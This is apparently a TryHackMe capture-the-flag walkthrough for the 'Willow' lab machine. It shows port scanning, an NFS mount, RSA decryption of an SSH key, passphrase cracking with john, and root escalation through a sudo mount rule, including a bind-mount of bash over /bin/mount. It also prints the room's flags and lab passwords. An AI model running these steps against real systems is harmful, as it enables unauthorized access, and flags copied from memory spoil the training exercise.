----
What lies under the Willow Tree?
----

![](https://i.imgur.com/8C4TXFS.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/e7e6f48a6ae9cb49f91e2934b14b5a34.png)

### Flags

 Start Machine

Grab the flags from the Willow  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.140.120 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.140.120:22
Open 10.10.140.120:80
Open 10.10.140.120:111
Open 10.10.140.120:2049
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 14:18 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:18
Completed Parallel DNS resolution of 1 host. at 14:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:18
Scanning 10.10.140.120 [4 ports]
Discovered open port 80/tcp on 10.10.140.120
Discovered open port 111/tcp on 10.10.140.120
Discovered open port 22/tcp on 10.10.140.120
Discovered open port 2049/tcp on 10.10.140.120
Completed Connect Scan at 14:18, 0.19s elapsed (4 total ports)
Initiating Service scan at 14:18
Scanning 4 services on 10.10.140.120
Completed Service scan at 14:18, 6.42s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.140.120.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 5.89s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.81s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Nmap scan report for 10.10.140.120
Host is up, received user-set (0.19s latency).
Scanned at 2023-04-22 14:18:25 EDT for 14s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 43b087cde55409b1c11e7865d9785e1e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJHkiuOeIrYxoyBBsJX2wpThJlvbsanlxpYXyHspzVIdeGQq3kD/2h1iNbOLwIb/iwS4oaY83OwxMiXImgKm/QgpgffrrKmU41eI/q9i+3NhLfHLvoT5PWupe/UW5Y3/lfmIMD1UXTUJNYiA07w/kHKj9ElQs7EZ2oZ9L5j2/h/lAAAAFQDE3pT3CTjQSOUOqdgu9HBaB6d6FwAAAIAFWqdfVx3v+GNxecTNp1mDb64WZcf2ssl/j+B6hj5W7s++DTY7Ls/i2R0z5bQes+5rMWYvanYFyWYEj31qWmrLvluJbJKldG3IttW5WfMzIyOJ11MHGAMP2/ZXZ4w3t8dMMudgBPkXE1uGv+p03A1i+Z6UfvGVv4HrtlCwqCRBywAAAIBpf+5ztR5aSDuZPxe/BURQIBKqDhOVZOt+Zhcc1GEcdukmlfmyH0sSm/3ae4CYLqBgD1zzwwSg4IkPR8wb1wa3G5F+OSYymEoKuxYWYN4LlSe9vrIap/1C/NO+jMQ5ru6WYqBcNdPqHQ4r5I7MzhziLdNIhfBmY076aL2Dr/OsAg==
|   2048 c26591c838c9ccc7f9092061e554bdcf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0/BxHjpZXU3EhwOMURG/xIJno/fZBBw2tntPhQMsA+L6YoVL4IyTKTz6SGM6BcX9622CGutBiO0pc0vhGlf9v/4cUB7My3d1r3t3EkNF0SaKAmAZLm8QOFbmS/TyHy9wF5TGJLunz5cN3NdGIz3Bz2GHHouicRo/vopYmHxjItfVgVUD2u+e5Gkw7u+U1BxZOrQDlaUS41AJvZm9Pk0pn2hWXeGTCJu8oyCqaEi/u8Wu7Ylp/t15NjEpiDpRp2LH9ctB3EG50LL+ti2o8/U652wIoNhnoF33eI6HJget9jvSC03oOx5r6NqHbOn94kVAUjFbYzK716dBa+I5jocHr
|   256 bf3e4b3d78b67941f47d90635efb2a40 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIW2cLhyEIs7aEuL5e/SGCx5HsLX1a1GfgE/YBPGXiaFt/AkVFA3leapIvX+CD5wc7wCKGDToBgx6bkIY9vb0T0=
|   256 2cc8874ad8f64cc3038d4c0922836664 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOsXsk2l13dc4bQlT0wYP6/4gpeoTx5IfVvOBF++ClPu
80/tcp   open  http    syn-ack Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Recovery Page
111/tcp  open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33137/udp6  mountd
|   100005  1,2,3      40449/tcp   mountd
|   100005  1,2,3      43406/udp   mountd
|   100005  1,2,3      52430/tcp6  mountd
|   100021  1,3,4      36864/tcp6  nlockmgr
|   100021  1,3,4      36897/tcp   nlockmgr
|   100021  1,3,4      37858/udp6  nlockmgr
|   100021  1,3,4      48916/udp   nlockmgr
|   100024  1          34484/udp6  status
|   100024  1          36227/tcp   status
|   100024  1          37362/udp   status
|   100024  1          56246/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs_acl syn-ack 2-3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds

Hey Willow, here's your SSH Private key -- you know where the decryption key is!

rpcbind is just used to map ports to services this will be how the NFS file server is running

┌──(witty㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.140.120
Export list for 10.10.140.120:
/var/failsafe *

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mkdir /mnt/willow-failsafe
                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mount 10.10.140.120:/var/failsafe /mnt/willow-failsafe
                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ ls -lah /mnt/willow-failsafe
total 12K
drwxr--r-- 2 nobody nogroup 4.0K Jan 30  2020 .
drwxr-xr-x 3 root   root    4.0K Apr 22 14:28 ..
-rw-r--r-- 1 root   root      62 Jan 30  2020 rsa_keys

┌──(witty㉿kali)-[/mnt/willow-failsafe]
└─$ pwd
/mnt/willow-failsafe
                                                                      
┌──(witty㉿kali)-[/mnt/willow-failsafe]
└─$ ls                          
rsa_keys
                                                                      
┌──(witty㉿kali)-[/mnt/willow-failsafe]
└─$ cat rsa_keys       
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)

rsa_decrypt script (from muirlandoracle)

┌──(witty㉿kali)-[~/Downloads]
└─$ cat rsa_decrypt.py 
import argparse

parser = argparse.ArgumentParser(description="Decode RSA")
parser.add_argument("file", help="The file containing the encrypted text")
parser.add_argument("d", help="The Private Key", type=int)
parser.add_argument("n", help="The Modulus", type=int)
args=parser.parse_args()

with open(args.file, "r") as coded:
    data = [int(i.strip("\n")) for i in coded.read().split(" ")]

for i in data:
    print(chr(i**args.d % args.n), end="")

┌──(witty㉿kali)-[~/Downloads]
└─$ more encoded.txt (from hex)
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 rsa_decrypt.py encoded.txt  61527 37627 > rsakey

┌──(witty㉿kali)-[~/Downloads]
└─$ cat rsakey
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
DHEvVNHFGY+Z2jvCQoGb0LOV8cvVTSDXtbNQ5f/Z3bMdN3AhMN3tQmqXTAPuOI1T
BXZ1aDS6x+s6ecKjybMV/dvnohG8+dDrssV4DPyTOLntpeBkqpSNeiM4MdhxTHj1
PCkDWfBXEAEA/hfvE1oWXMNguy3vlvKn8Sk9We5fl+tEBvPjPNSWrEHksq4ZJWSz
JMEyWi/AxTnHDFiO+3m0Eovw41tdreBU2S6QbYsa9OOAiBnDmWn2m0YmAwS0636L
NJ0Ay4L+ixfYZ+F/5oVQbhvDoXnQCO58mNYqqlDVtD/21aj1+RtoYxSX2f/jxCXt
AMF890psZEugk+mhRZZ6HCvDewmBWkghrZeREEmuWAFkQWV/3gVdMpSdteWM7YIQ
MxkyUMs4jmwvA4ktznTVN1kK7VAtkIUa8+UuVUfchKpQQjwpbGgfdMrcJe55tOdk
M7mSP/jAl9bXlpyikMhrsdkVyNpFtmJU8EGJ4v5GlQzUDuySBCiwcZ7x6u3hpDG+
/+5Nf8423Dy/iAhSWAjoZD3BdkLnfbji1g4dNrJnqHnoZaZxvxs0qQEi/NcOEm4e
W0pyDdA8so0zkTTd7gm6WFarM7ywGec5rX08gT5v3dDYbPA46LJVprtA+D3ymeR4
l3xMq6RDfzFIFa6MWS8yCK67p7mPxSfqvC5NDMONQ/fz+7fO3/pjKBYZYLuchpk4
TsH6aY4QbgnEMuA+Errb/uf/5MAhWDMqLBhi42kxaXZ1e3ZMz2penCZFf/nofbLc
-----END RSA PRIVATE KEY----- 

or using this page :)

https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html

Modulus: 37627 , decryption key: 37627 , ciphertext msg (from hex)

┌──(witty㉿kali)-[~/Downloads]
└─$ nano willow_idrsa 
                                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 willow_idrsa 
                                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ cat willow_idrsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
DHEvVNHFGY+Z2jvCQoGb0LOV8cvVTSDXtbNQ5f/Z3bMdN3AhMN3tQmqXTAPuOI1T
BXZ1aDS6x+s6ecKjybMV/dvnohG8+dDrssV4DPyTOLntpeBkqpSNeiM4MdhxTHj1
PCkDWfBXEAEA/hfvE1oWXMNguy3vlvKn8Sk9We5fl+tEBvPjPNSWrEHksq4ZJWSz
JMEyWi/AxTnHDFiO+3m0Eovw41tdreBU2S6QbYsa9OOAiBnDmWn2m0YmAwS0636L
NJ0Ay4L+ixfYZ+F/5oVQbhvDoXnQCO58mNYqqlDVtD/21aj1+RtoYxSX2f/jxCXt
AMF890psZEugk+mhRZZ6HCvDewmBWkghrZeREEmuWAFkQWV/3gVdMpSdteWM7YIQ
MxkyUMs4jmwvA4ktznTVN1kK7VAtkIUa8+UuVUfchKpQQjwpbGgfdMrcJe55tOdk
M7mSP/jAl9bXlpyikMhrsdkVyNpFtmJU8EGJ4v5GlQzUDuySBCiwcZ7x6u3hpDG+
/+5Nf8423Dy/iAhSWAjoZD3BdkLnfbji1g4dNrJnqHnoZaZxvxs0qQEi/NcOEm4e
W0pyDdA8so0zkTTd7gm6WFarM7ywGec5rX08gT5v3dDYbPA46LJVprtA+D3ymeR4
l3xMq6RDfzFIFa6MWS8yCK67p7mPxSfqvC5NDMONQ/fz+7fO3/pjKBYZYLuchpk4
TsH6aY4QbgnEMuA+Errb/uf/5MAhWDMqLBhi42kxaXZ1e3ZMz2penCZFf/nofbLc
-----END RSA PRIVATE KEY-----

──(witty㉿kali)-[~/Downloads]
└─$ ssh -i willow_idrsa willow@10.10.140.120
The authenticity of host '10.10.140.120 (10.10.140.120)' can't be established.
ED25519 key fingerprint is SHA256:magOpLj2XlET5C4pPvsDHoHa4Po1iJpM2eNFkXQUZ2I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? ye
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.140.120' (ED25519) to the list of known hosts.
Enter passphrase for key 'willow_idrsa':

using john

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh2john willow_idrsa > willow_hash.txt
                                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt willow_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wildflower       (willow_idrsa)     
1g 0:00:00:00 DONE (2023-04-22 14:59) 16.66g/s 168533p/s 168533c/s 168533C/s chulita..simran
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

passphrase: wildflower

┌──(root㉿kali)-[/home/witty/Downloads]
└─# ssh -i id_willow willow@10.10.140.120
Enter passphrase for key 'id_willow': 
sign_and_send_pubkey: no mutual signature supported
willow@10.10.140.120's password: 

uhmm

https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_willow willow@10.10.140.120
Enter passphrase for key 'id_willow': 




	"O take me in your arms, love
	For keen doth the wind blow
	O take me in your arms, love
	For bitter is my deep woe."
		 -The Willow Tree, English Folksong




willow@willow-tree:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.jpg  Videos

┌──(witty㉿kali)-[~/Downloads]
└─$ scp -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_willow willow@10.10.140.120:user.jpg .
Enter passphrase for key 'id_willow': 
user.jpg                        100%   12KB  21.4KB/s   00:00 

┌──(witty㉿kali)-[~/Downloads]
└─$ eog user.jpg 

THM{beneath_the_weeping_willow_tree}

willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*

willow@willow-tree:~$ ls /dev
autofs           input               rtc       tty18  tty35  tty52  ttyS3    vcsa7
block            kmsg                rtc0      tty19  tty36  tty53  uhid     vfio
btrfs-control    log                 shm       tty2   tty37  tty54  uinput   vga_arbiter
char             loop-control        snapshot  tty20  tty38  tty55  urandom  vhci
console          mapper              snd       tty21  tty39  tty56  vcs      vhost-net
core             mcelog              stderr    tty22  tty4   tty57  vcs1     vmci
cpu              mem                 stdin     tty23  tty40  tty58  vcs2     xconsole
cpu_dma_latency  mqueue              stdout    tty24  tty41  tty59  vcs3     xen
cuse             net                 tty       tty25  tty42  tty6   vcs4     xvda
disk             network_latency     tty0      tty26  tty43  tty60  vcs5     xvda1
dri              network_throughput  tty1      tty27  tty44  tty61  vcs6     xvda2
fb0              null                tty10     tty28  tty45  tty62  vcs7     xvda3
fd               port                tty11     tty29  tty46  tty63  vcsa     xvdh
full             ppp                 tty12     tty3   tty47  tty7   vcsa1    zero
fuse             psaux               tty13     tty30  tty48  tty8   vcsa2
hidden_backup    ptmx                tty14     tty31  tty49  tty9   vcsa3
hpet             pts                 tty15     tty32  tty5   ttyS0  vcsa4
hugepages        random              tty16     tty33  tty50  ttyS1  vcsa5
initctl          rfkill              tty17     tty34  tty51  ttyS2  vcsa6

willow@willow-tree:~$ ls /mnt
creds
willow@willow-tree:~$ ls /mnt/creds/

willow@willow-tree:~$ sudo /bin/mount /dev/hidden_backup /mnt/creds
willow@willow-tree:~$ cd /mnt/creds/
willow@willow-tree:/mnt/creds$ ls
creds.txt
willow@willow-tree:/mnt/creds$ cat creds.txt 
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
willow@willow-tree:/mnt/creds$ su root
Password: 
root@willow-tree:/mnt/creds# cd /root
root@willow-tree:~# ls
root.txt
root@willow-tree:~# cat root.txt 
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag! (maybe stego)

or

willow@willow-tree:~$ cp /bin/bash /dev/shm/
willow@willow-tree:~$ cd /dev/shm
willow@willow-tree:/dev/shm$ ls
bash                  pulse-shm-2785350845  pulse-shm-90898252
pulse-shm-1194606719  pulse-shm-90638723
willow@willow-tree:/dev/shm$ sudo /bin/mount /dev/shm/bash /bin/mount -o force,bind

willow@willow-tree:/dev/shm$ echo "bash" > /dev/shm/shell
willow@willow-tree:/dev/shm$ ls
bash                  pulse-shm-2785350845  pulse-shm-90898252
pulse-shm-1194606719  pulse-shm-90638723    shell
willow@willow-tree:/dev/shm$ sudo /bin/mount /dev/shm/shell
root@willow-tree:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)

but with this method cannot get creds.txt

┌──(witty㉿kali)-[~/Downloads]
└─$ steghide extract -sf user.jpg
Enter passphrase: 7QvbvBTvwPspUK
wrote extracted data to "root.txt".
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cat root.txt 
THM{find_a_red_rose_on_the_grave}

```

User Flag:  

https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/

![[Pasted image 20230422135442.png]]
![[Pasted image 20230422141750.png]]

*THM{beneath_the_weeping_willow_tree}*

Root Flag:

Where, on a Linux system, would you first look for unmounted partitions?

*THM{find_a_red_rose_on_the_grave}*

[[VulnNet Endgame]]